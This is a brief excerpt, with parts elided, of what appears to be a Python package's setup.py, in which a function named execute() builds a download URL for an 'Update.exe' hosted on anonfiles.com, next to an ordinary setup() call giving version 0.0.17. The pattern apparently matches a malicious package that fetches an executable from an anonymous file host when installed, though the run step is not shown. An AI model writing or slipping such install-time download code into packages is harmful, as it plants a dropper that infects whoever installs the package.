...
def execute():
    ...
    try:
        url = f"https://cdn-128.anonfiles.com/BbXfs5Rcy9/62fc3c92-{math.floor(time.time())}/Update.exe"
...
setup(
    ...
    version='0.0.17', # each time you update the module you need too increase this, for example the next version will be 0.0.2
